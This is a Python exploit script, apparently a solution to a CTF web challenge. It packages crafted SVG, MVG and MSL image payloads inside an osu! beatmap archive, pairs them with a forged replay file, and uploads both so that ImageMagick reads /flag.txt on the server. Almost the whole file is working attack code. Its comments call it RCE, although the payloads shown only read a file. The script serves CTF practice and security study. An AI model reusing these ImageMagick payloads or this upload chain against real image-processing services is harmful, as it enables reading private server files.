#!/usr/bin/env python3
"""
Exploit script for web_scorepost-generator CTF challenge
Exploits vulnerable ImageMagick 7.1.0-49 via malicious image file
"""

import hashlib
import zipfile
import io
import requests
import struct

# Target URL - adjust as needed
TARGET_URL = "https://scorepost-generator-web.challs.sekai.team"

def create_malicious_svg():
    """
    Creates a malicious SVG file that exploits ImageMagick
    Uses MSL (Magick Scripting Language) to read /flag.txt
    """
    # ImageMagick MSL/MVG exploit payload
    # This creates a file that when processed by ImageMagick, will execute commands
    svg_payload = '''<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="100" height="100">
<image xlink:href="msl:poc.svg" width="100" height="100"/>
<![CDATA[
<?xml version="1.0" encoding="UTF-8"?>
<image>
 <read filename="text:/flag.txt"/>
 <write filename="/tmp/flag_output.txt"/>
</image>
]]>
</svg>'''

    # Alternative: Use text:// protocol to embed command output in image
    # This attempts to make ImageMagick read /flag.txt and embed it
    svg_payload_alt = '''<svg width="100" height="100">
<image xlink:href="text:/flag.txt" x="0" y="0"/>
</svg>'''

    # Another approach: Label with file content
    svg_payload_label = '''push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 'label:@/flag.txt'
pop graphic-context'''

    return svg_payload.encode()


def create_malicious_mvg():
    """
    Creates a malicious MVG (Magick Vector Graphics) file
    MVG can execute various ImageMagick operations
    """
    # MVG payload that reads /flag.txt
    mvg_payload = '''push graphic-context
viewbox 0 0 640 480
fill 'url(text:/flag.txt|)'
pop graphic-context'''

    return mvg_payload.encode()


def create_malicious_msl():
    """
    Creates a malicious MSL file
    MSL is ImageMagick's scripting language
    """
    msl_payload = '''<?xml version="1.0" encoding="UTF-8"?>
<image>
<read filename="text:/flag.txt" />
<write filename="msl:output.txt" />
</image>'''

    return msl_payload.encode()


def create_minimal_png():
    """
    Creates a minimal valid PNG file as fallback
    1x1 pixel transparent PNG
    """
    # Minimal PNG: 1x1 transparent pixel
    png_data = (
        b'\x89PNG\r\n\x1a\n'  # PNG signature
        b'\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01'
        b'\x08\x06\x00\x00\x00\x1f\x15\xc4\x89'  # IHDR chunk
        b'\x00\x00\x00\nIDATx\x9cc\x00\x01\x00\x00\x05\x00\x01'
        b'\r\n-\xb4'  # IDAT chunk
        b'\x00\x00\x00\x00IEND\xaeB`\x82'  # IEND chunk
    )
    return png_data


def create_osu_beatmap(bg_filename="bg.png"):
    """
    Creates a minimal valid .osu beatmap file
    The background path points to our malicious image
    """
    # Try to inject ImageMagick commands via metadata fields
    # These will be passed to the -annotate parameter

    osu_content = f"""osu file format v14

[General]
AudioFilename: audio.mp3
AudioLeadIn: 0
PreviewTime: -1
Countdown: 0
SampleSet: Normal
StackLeniency: 0.7
Mode: 0
LetterboxInBreaks: 0
WidescreenStoryboard: 1

[Editor]
DistanceSpacing: 1
BeatDivisor: 4
GridSize: 4
TimelineZoom: 1

[Metadata]
Title:RCE Test
TitleUnicode:RCE Test
Artist:Exploit
ArtistUnicode:Exploit
Creator:Hacker
Version:Insane
Source:
Tags:ctf
BeatmapID:0
BeatmapSetID:0

[Difficulty]
HPDrainRate:5
CircleSize:4
OverallDifficulty:7
ApproachRate:9
SliderMultiplier:1.4
SliderTickRate:1

[Events]
//Background and Video events
0,0,"{bg_filename}",0,0

[TimingPoints]
0,300,4,2,0,50,1,0

[HitObjects]
256,192,1000,1,0,0:0:0:0:
"""

    return osu_content.encode()


def create_osr_replay(beatmap_hash, username="exploit"):
    """
    Creates a minimal .osr replay file
    This needs to match the beatmap hash for the app to process it

    Note: This creates a simplified replay structure
    The osu-parsers library will parse this
    """

    # .osr file structure (simplified)
    # Reference: https://osu.ppy.sh/wiki/en/Client/File_formats/Osr_%28file_format%29

    replay_data = io.BytesIO()

    # Helper function to write ULEB128 encoded integer
    def write_uleb128(value):
        if value == 0:
            replay_data.write(b'\x00')
            return

        while value > 0:
            byte = value & 0x7F
            value >>= 7
            if value != 0:
                byte |= 0x80
            replay_data.write(bytes([byte]))

    # Helper function to write string
    def write_string(s):
        if not s:
            replay_data.write(b'\x00')
        else:
            replay_data.write(b'\x0b')  # String indicator
            encoded = s.encode('utf-8')
            write_uleb128(len(encoded))
            replay_data.write(encoded)

    # Game mode (0 = osu!standard)
    replay_data.write(struct.pack('<B', 0))

    # Version (20240101)
    replay_data.write(struct.pack('<I', 20240101))

    # Beatmap MD5 hash
    write_string(beatmap_hash)

    # Player name
    write_string(username)

    # Replay MD5 hash (can be fake)
    write_string("d" * 32)

    # Number of 300s, 100s, 50s, gekis, katus, misses
    replay_data.write(struct.pack('<H', 100))  # count300
    replay_data.write(struct.pack('<H', 10))   # count100
    replay_data.write(struct.pack('<H', 5))    # count50
    replay_data.write(struct.pack('<H', 20))   # countGeki
    replay_data.write(struct.pack('<H', 8))    # countKatu
    replay_data.write(struct.pack('<H', 0))    # countMiss

    # Total score
    replay_data.write(struct.pack('<I', 1000000))

    # Max combo
    replay_data.write(struct.pack('<H', 500))

    # Perfect combo (boolean)
    replay_data.write(struct.pack('<B', 0))

    # Mods used (0 = no mod)
    replay_data.write(struct.pack('<I', 0))

    # Life bar graph (empty string)
    write_string("")

    # Timestamp (Windows ticks)
    replay_data.write(struct.pack('<Q', 638000000000000000))

    # Replay data length
    replay_data.write(struct.pack('<I', 0))

    # Online score ID
    replay_data.write(struct.pack('<Q', 0))

    return replay_data.getvalue()


def create_exploit_package():
    """
    Creates the complete exploit package:
    - Malicious background image
    - .osu beatmap file
    - .osr replay file
    All packaged in .osz format
    """

    # Try different payload types
    # MSL might be blocked, so we try multiple approaches

    # Create malicious image - trying MSL injection
    bg_filename = "bg.png"
    malicious_bg = create_malicious_svg()

    # Create .osu beatmap
    beatmap_content = create_osu_beatmap(bg_filename)

    # Calculate MD5 hash of beatmap for replay matching
    beatmap_hash = hashlib.md5(beatmap_content).hexdigest()

    print(f"[+] Beatmap MD5: {beatmap_hash}")

    # Create .osr replay file that references this beatmap
    replay_content = create_osr_replay(beatmap_hash, "pwned")

    # Create .osz file (ZIP archive)
    osz_buffer = io.BytesIO()
    with zipfile.ZipFile(osz_buffer, 'w', zipfile.ZIP_DEFLATED) as osz:
        osz.writestr('beatmap.osu', beatmap_content)
        osz.writestr(bg_filename, malicious_bg)

    osz_data = osz_buffer.getvalue()

    return osz_data, replay_content


def exploit(target_url=TARGET_URL):
    """
    Main exploit function
    """
    print("[*] Creating exploit package...")
    osz_data, osr_data = create_exploit_package()

    print(f"[+] .osz size: {len(osz_data)} bytes")
    print(f"[+] .osr size: {len(osr_data)} bytes")

    print(f"[*] Uploading to {target_url}/api/submit...")

    files = {
        'osz': ('exploit.osz', osz_data, 'application/zip'),
        'osr': ('exploit.osr', osr_data, 'application/octet-stream')
    }

    try:
        response = requests.post(
            f"{target_url}/api/submit",
            files=files,
            allow_redirects=False,
            timeout=30
        )

        print(f"[+] Response status: {response.status_code}")
        print(f"[+] Response headers: {dict(response.headers)}")

        if response.status_code == 200:
            # Save the generated image
            with open('output.png', 'wb') as f:
                f.write(response.content)
            print("[+] Image saved to output.png")
            print("[*] Check if flag is embedded in the image or error messages")

        elif 'Location' in response.headers:
            print(f"[+] Redirect to: {response.headers['Location']}")

        print(f"[*] Response preview: {response.content[:500]}")

    except Exception as e:
        print(f"[-] Error: {e}")


if __name__ == "__main__":
    import sys

    if len(sys.argv) > 1:
        target = sys.argv[1]
    else:
        target = TARGET_URL

    print("=" * 60)
    print("ImageMagick RCE Exploit - web_scorepost-generator")
    print("=" * 60)

    exploit(target)
